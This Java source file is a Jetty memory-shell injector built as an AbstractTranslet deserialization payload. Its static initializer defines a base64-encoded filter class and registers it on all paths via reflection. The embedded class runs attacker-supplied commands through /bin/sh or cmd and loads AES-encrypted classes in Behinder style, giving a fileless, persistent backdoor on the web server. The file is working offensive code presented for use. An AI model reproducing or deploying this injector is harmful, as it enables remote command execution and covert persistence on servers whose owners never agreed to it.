package com.boogipop.memshell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import jakarta.servlet.Filter;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Base64;


public class InjectJettyFilter extends AbstractTranslet {


    private static Object servletHandler = null;
    private static String filterName = "HFilter";
    private static String filterClassName = "com.HFilter";
    private static String url = "/*";

    private static byte[] BASE64Decoder(String data){
        byte[] inputBytes = data.getBytes();
        Base64.Decoder encoder = Base64.getDecoder();
        byte[] encodedBytes = encoder.decode(inputBytes);
        return encodedBytes;
    }
    private static synchronized void LoadFilter() throws Exception {
        try{
            Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();
        }catch (Exception e){
            Method a = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            a.setAccessible(true);
            byte[] b = BASE64Decoder("yv66vgAAADQBJwoAQwCCCgAQAIMKAIQAhQoAYACGCQCHAIgIAIkKAIoAiwgAjAsAQACNCACOCgAQAI8KAJAAkQoAEACSCQCTAJQIAJUHAJYIAJcIAJgIAGkIAJkHAJoKAJsAnAoAmwCdCgCeAJ8KABUAoAgAoQoAFQCiCgAVAKMLAEEApAoApQCLBwCmCgCQAKcLAB8AqAsAHwCpCACqCgCQAKsLAB8ArAgArQsArgCvCACwCgCxALIHALMHALQKACsAggsArgC1CgArALYIALcKACsAuAoAKwC5CgAqALoKALEAuwsAQAC8CgC9AL4KAEgAvwoAsQDABwDBCgBDAMIKAD8AwwoAOADECgA4AMUKAD8AxggAxwcAyAcAyQcAygoAPwDLBwDMCgDNAM4HAM8KAEUA0AsA0QDSBwDTBwDUAQABVQEADElubmVyQ2xhc3NlcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAmTGNvbS9ib29naXBvcC9tZW1zaGVsbC9GaWx0ZXJUZW1wbGF0ZTsBAARpbml0AQAhKExqYWthcnRhL3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAeTGpha2FydGEvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcA1QEADUJBU0U2NERlY29kZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAEZGF0YQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACmlucHV0Qnl0ZXMBAAJbQgEAB2VuY29kZXIHANYBAAdEZWNvZGVyAQAaTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBAAxlbmNvZGVkQnl0ZXMBAAhkb0ZpbHRlcgEAYShMamFrYXJ0YS9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYWthcnRhL3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYWthcnRhL3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAA2NtZAEAAWsBAAZjaXBoZXIBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAA5ldmlsQ2xhc3NCeXRlcwEACWV2aWxDbGFzcwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADnNlcnZsZXRSZXF1ZXN0AQAgTGpha2FydGEvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBACFMamFrYXJ0YS9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAHUxqYWthcnRhL3NlcnZsZXQvRmlsdGVyQ2hhaW47AQANU3RhY2tNYXBUYWJsZQcAZwcA1wEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQATRmlsdGVyVGVtcGxhdGUuamF2YQwATABNDADYANkHANoMANsA3AwA3QDeBwDfDADgAOEBAB1bK10gRHluYW1pYyBGaWx0ZXIgc2F5cyBoZWxsbwcA4gwA4wDkAQAEdHlwZQwA5QDmAQAFYmFzaWMMAMcA5wcA6AwA6QDqDADrAOwHAO0MAO4AXAEAAS8BABBqYXZhL2xhbmcvU3RyaW5nAQAHL2Jpbi9zaAEAAi1jAQACL0MBABFqYXZhL3V0aWwvU2Nhbm5lcgcA7wwA8ADxDADyAPMHAPQMAPUA9gwATAD3AQACXEEMAPgA+QwA+gDqDAD7APwHAP0BACdqYWthcnRhL3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAP4A6gwA/gDmDAD/AOoBAARQT1NUDAEAAOoMAQEBAgEAAXUHAQMMAQQBBQEAA0FFUwcBBgwBBwEIAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEJAQoMAQsBDAEAAAwBCwENDAEOAOoMAEwBDwwAUwEQDAERARIHARMMARQA6gwAWQBaDAEVAN4BACZjb20vYm9vZ2lwb3AvbWVtc2hlbGwvRmlsdGVyVGVtcGxhdGUkVQwBFgEXDAEYARkMAEwBGgwBGwEcDAEdAR4BAAZlcXVhbHMBAA9qYXZhL2xhbmcvQ2xhc3MBAB5qYWthcnRhL3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB9qYWthcnRhL3NlcnZsZXQvU2VydmxldFJlc3BvbnNlDAEfASABABBqYXZhL2xhbmcvT2JqZWN0BwEhDAEiASMBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAEkAE0HASUMAGQBJgEAJGNvbS9ib29naXBvcC9tZW1zaGVsbC9GaWx0ZXJUZW1wbGF0ZQEAFmpha2FydGEvc2VydmxldC9GaWx0ZXIBACBqYWthcnRhL3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAGGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAhnZXRCeXRlcwEABCgpW0IBABBqYXZhL3V0aWwvQmFzZTY0AQAKZ2V0RGVjb2RlcgEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBAAZkZWNvZGUBAAYoW0IpW0IBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAHGNvbS9ib29naXBvcC9tZW1zaGVsbC9Db25maWcBAAtnZXRQYXNzd29yZAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAHaXNFbXB0eQEAAygpWgEADGphdmEvaW8vRmlsZQEACXNlcGFyYXRvcgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEACWdldEhlYWRlcgEACWdldE1ldGhvZAEAFmdldEJlaGluZGVyU2hlbGxQd2RQd2QBAApnZXRTZXNzaW9uAQAkKClMamFrYXJ0YS9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAgamFrYXJ0YS9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAJZ2V0UmVhZGVyAQAaKClMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAIcmVhZExpbmUBAAdkb0ZpbmFsAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQBAKExjb20vYm9vZ2lwb3AvbWVtc2hlbGwvRmlsdGVyVGVtcGxhdGU7TGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAWcBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAbamFrYXJ0YS9zZXJ2bGV0L0ZpbHRlckNoYWluAQBEKExqYWthcnRhL3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGpha2FydGEvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYAIQBIAEMAAQBJAAAABQABAEwATQABAE4AAAAvAAEAAQAAAAUqtwABsQAAAAIATwAAAAYAAQAAAA4AUAAAAAwAAQAAAAUAUQBSAAAAAQBTAFQAAgBOAAAANQAAAAIAAAABsQAAAAIATwAAAAYAAQAAABIAUAAAABYAAgAAAAEAUQBSAAAAAAABAFUAVgABAFcAAAAEAAEAWAAKAFkAWgABAE4AAABlAAIABAAAABEqtgACTLgAA00sK7YABE4tsAAAAAIATwAAABIABAAAABQABQAVAAkAFgAPABcAUAAAACoABAAAABEAWwBcAAAABQAMAF0AXgABAAkACABfAGIAAgAPAAIAYwBeAAMAAQBkAGUAAgBOAAACvgAHAAoAAAGDsgAFEga2AAcrEgi5AAkCAMYAkCsSCLkACQIAEgq2AAuZAIAruAAMuQAJAgA6BBkExgBtGQS2AA2aAGUBOgWyAA4SD7YAC5kAGwa9ABBZAxIRU1kEEhJTWQUZBFM6BacAGAa9ABBZAxITU1kEEhRTWQUZBFM6BbsAFVm4ABYZBbYAF7YAGLcAGRIatgAbtgAcOgYsuQAdAQAZBrYAHqcA5SvAAB+4ACC5ACECAMYAzivAAB+5ACIBABIjtgALmQCwuAAkOgQrwAAfuQAlAQASJhkEuQAnAwASKLgAKToFGQUFuwAqWbsAK1m3ACwrwAAfuQAlAQASJrkALQIAtgAuEi+2ADC2ADG2AAISKLcAMrYAMxkFK7kANAEAtgA1uAA2tgA3Oga7ADhZKiq2ADm2ADq3ADsZBrYAPDoHGQe2AD06CBkHEj4FvQA/WQMSQFNZBBJBU7YAQjoJGQkZCAW9AENZAytTWQQsU7YARFenABU6BBkEtgBGpwALLSssuQBHAwCxAAEArwFtAXAARQADAE8AAABuABsAAAAcAAgAHgAjACAALgAhADsAIgA+ACMASQAkAGEAJgB2ACgAkgApAJ0AKwCvAC4AwAAvAMUAMADXADEA3gAyARIAMwElADQBOwA1AUIANgFZADcBbQA7AXAAOQFyADoBdwA7AXoAPQGCAD8AUAAAAI4ADgA+AF8AZgBnAAUAkgALAGgAXAAGAC4AbwBpAFwABADFAKgAagBcAAQA3gCPAGsAbAAFASUASABtAF4ABgE7ADIAbgBvAAcBQgArAHAAcQAIAVkAFAByAHMACQFyAAUAdAB1AAQAAAGDAFEAUgAAAAABgwB2AHcAAQAAAYMAeAB5AAIAAAGDAHoAewADAHwAAAAZAAj9AGEHABAHAH0U+QAmAvsAzEIHAEUJBwBXAAAABgACAH4AWAABAH8ATQABAE4AAAArAAAAAQAAAAGxAAAAAgBPAAAABgABAAAARABQAAAADAABAAAAAQBRAFIAAAACAIAAAAACAIEASwAAABIAAgA4AEgASgAAAGAAhABhAAk=");
            a.invoke(Thread.currentThread().getContextClassLoader(), b, 0, b.length);
        }
    }

    //获取上下文
    public static synchronized void GetWebContent() throws Exception {
        try{
            Thread currentThread = Thread.currentThread();
            Object contextClassLoader = GetField(currentThread, "contextClassLoader");
            Object _context = GetField(contextClassLoader,"_context");
            servletHandler = GetField(_context,"_servletHandler");
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static synchronized void InjectFilter() throws Exception {
        if(servletHandler != null){
            //方法一
            Filter HFilter = (Filter) Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();
            ArrayList filterPathMappings = (ArrayList) GetField(servletHandler,"_filterPathMappings");

            Constructor constructor2 = servletHandler.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterHolder").getDeclaredConstructor();
            constructor2.setAccessible(true);
            Object filterHolder = constructor2.newInstance();

            Method setFilter = filterHolder.getClass().getDeclaredMethod("setFilter", Filter.class);
            setFilter.invoke(filterHolder,HFilter);

            Method setName = filterHolder.getClass().getSuperclass().getDeclaredMethod("setName",String.class);
            setName.invoke(filterHolder,filterName);

            Constructor constructor = servletHandler.getClass().getClassLoader().loadClass("org.eclipse.jetty.servlet.FilterMapping").getDeclaredConstructor();
            constructor.setAccessible(true);
            Object filterMapping = constructor.newInstance();

            Method setFilterName = filterMapping.getClass().getDeclaredMethod("setFilterName",String.class);
            setFilterName.invoke(filterMapping,filterName);

            Method setFilterHolder = filterMapping.getClass().getDeclaredMethod("setFilterHolder",filterHolder.getClass());
            setFilterHolder.setAccessible(true);
            setFilterHolder.invoke(filterMapping,filterHolder);

            String pathSpecs = url;

            Method setPathSpec = filterMapping.getClass().getDeclaredMethod("setPathSpec",String.class);
            setPathSpec.invoke(filterMapping,pathSpecs);

            filterPathMappings.add(filterMapping);
            System.out.println("123");

            /*           
            //方法二
            Class HFilter = Thread.currentThread().getContextClassLoader().loadClass(filterClassName);
            Method addFilterWithMapping = GetMethod(servletHandler, "addFilterWithMapping", Class.class, String.class, Integer.TYPE);
            addFilterWithMapping.invoke(servletHandler, HFilter, "/*", 1);

            //使用addFilterWithMapping有个问题，动态添加FilterMapping时，其dispatches可能会与已加载到内存中的FilterMapping重复了，因此需要调整元素在_filterPathMappings中的位置
            Object filterMaps = GetField(servletHandler, "_filterMappings");
            Object[] tmpFilterMaps = new Object[Array.getLength(filterMaps)];
            int n = 1;
            int j;

            for(j = 0; j < Array.getLength(filterMaps); ++j) {
                Object filter = Array.get(filterMaps, j);
                String filterName = (String)GetField(filter, "_filterName");
                if (filterName.contains(HFilter.getName())) {
                    tmpFilterMaps[0] = filter;
                } else {
                    tmpFilterMaps[n] = filter;
                    ++n;
                }
            }
            for(j = 0; j < tmpFilterMaps.length; ++j) {
                Array.set(filterMaps, j, tmpFilterMaps[j]);
            }*/
        }

    }

    private static synchronized Object GetField(Object o, String k) throws Exception{
        Field f;
        try {
            f = o.getClass().getDeclaredField(k);
        } catch (NoSuchFieldException e) {
            try{
                f = o.getClass().getSuperclass().getDeclaredField(k);
            }catch (Exception e1){
                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);
            }
        }
        f.setAccessible(true);
        return f.get(o);
    }

    private static synchronized Method GetMethod(Object obj, String methodName, Class<?>... paramClazz) throws NoSuchMethodException {
        Method method = null;
        Class clazz = obj.getClass();

        while(clazz != Object.class) {
            try {
                method = clazz.getDeclaredMethod(methodName, paramClazz);
                break;
            } catch (NoSuchMethodException var6) {
                clazz = clazz.getSuperclass();
            }
        }

        if (method == null) {
            throw new NoSuchMethodException(methodName);
        } else {
            method.setAccessible(true);
            return method;
        }
    }


    static {
        new InjectJettyFilter();
    }

    public InjectJettyFilter(){
        try{
            LoadFilter();
            GetWebContent();
            InjectFilter();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }


    public static void main(String[] args) {

    }
}